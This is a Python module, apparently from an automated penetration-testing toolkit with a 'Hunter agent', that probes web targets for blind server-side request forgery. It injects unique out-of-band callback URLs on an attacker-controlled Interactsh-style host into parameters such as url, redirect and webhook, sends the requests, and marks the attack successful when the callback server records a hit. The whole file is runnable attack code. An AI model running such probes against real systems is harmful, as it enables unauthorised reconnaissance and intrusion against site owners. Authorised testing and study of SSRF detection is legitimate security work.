"""Blind SSRF probe via Interactsh-style OOB callback.

Injects an Interactsh-issued callback URL into candidate request parameters
and waits for the OOB server to record a hit. Hit ⇒ the target made an
outbound request to attacker-controlled infrastructure → SSRF confirmed.

This implementation does the *injection* synchronously. Polling for the
OOB hit is the operator's responsibility today — set
``settings.json:interactsh_url`` to a session URL and the Hunter agent will
correlate hits during Phase E. For now we record the payload sent and
return success only if the caller passes an ``oob_observed`` callback that
returns True.

opts shape::
    {
      "interactsh_url":   "abcd1234.oast.live"  (required; from settings),
      "candidate_params": ["url", "next", "redirect", "image", "callback", "webhook"],
      "method":           "GET" | "POST",
      "oob_observed":     callable() -> bool   (optional; polls Interactsh)
    }
"""
from __future__ import annotations

import secrets
import urllib.parse
import urllib.request
import urllib.error
from typing import Any, Callable, Dict, List

from .base import AttackResult, _result_error


_DEFAULT_PARAMS = ("url", "next", "redirect", "image", "callback",
                   "webhook", "uri", "src", "dest", "proxy", "host")


def _inject(target: str, param: str, payload: str) -> str:
    """Build URL with ``param=payload`` injected into the query string."""
    parts = urllib.parse.urlparse(target)
    qs    = dict(urllib.parse.parse_qsl(parts.query))
    qs[param] = payload
    return urllib.parse.urlunparse(parts._replace(
        query=urllib.parse.urlencode(qs)
    ))


def run(target: str, opts: Dict[str, Any]) -> AttackResult:
    oob_host = (opts.get("interactsh_url") or "").strip()
    if not oob_host:
        return _result_error("ssrf",
            "interactsh_url not configured (settings.json:interactsh_url)")
    params  = opts.get("candidate_params") or list(_DEFAULT_PARAMS)
    method  = opts.get("method", "GET")
    observe = opts.get("oob_observed")  # optional callable

    sent: List[Dict[str, Any]] = []
    for param in params:
        # Unique per-param token so the OOB log lets us trace which
        # parameter triggered the request.
        token   = secrets.token_hex(6)
        payload = f"http://{token}.{oob_host}/"
        url     = _inject(target, param, payload)
        try:
            req = urllib.request.Request(url, method=method)
            with urllib.request.urlopen(req, timeout=8) as resp:
                status = resp.status
        except urllib.error.HTTPError as e:
            status = e.code
        except Exception as e:
            sent.append({"param": param, "payload": payload, "url": url,
                         "error": str(e)})
            continue
        sent.append({"param": param, "payload": payload, "url": url,
                     "status": status, "token": token})

    # Without OOB polling we can't confirm the callback. Defer to caller.
    observed = False
    if callable(observe):
        try:
            observed = bool(observe())
        except Exception:
            observed = False

    if observed:
        return AttackResult(
            technique="ssrf", success=True, confidence=0.90,
            summary=f"Blind SSRF confirmed via OOB callback to {oob_host}",
            evidence=sent,
        )
    return AttackResult(
        technique="ssrf", success=False, confidence=0.0,
        summary=(f"Injected {len(sent)} SSRF probes against {target}; "
                 f"OOB confirmation pending (poll {oob_host})"),
        evidence=sent,
    )
